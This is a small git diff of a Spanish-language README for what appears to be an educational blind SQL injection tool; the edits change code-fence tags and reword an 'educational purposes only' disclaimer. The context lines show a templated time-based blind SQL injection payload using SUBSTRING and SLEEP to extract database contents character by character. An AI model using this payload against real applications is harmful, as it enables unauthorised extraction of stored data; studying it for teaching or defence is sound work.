@@ -14,15 +14,15 @@ Algunas consideraciones
 
 ### Procedimiento:
 Partiendo de la base en la que podemos validar una inyección exitosa con
-```SQL
+```mysql
   1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
 ```
 Procedimos a 
-```SQL
+```MySQL
   1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
 ```
     
 ## Disclaimer
 
-El autor no se hace responsable de algún uso inadecuado que pueda causar impactos negativos. El propósito es y sólo es con fines educativos.
+El autor no se hace responsable de algún uso inadecuado del repositorio que pueda causar impactos negativos. El propósito es y sólo es, con fines educativos.
 Las contribuciones son bienvenidas, también siéntete libre de mejorar y modificar según sea necesario.
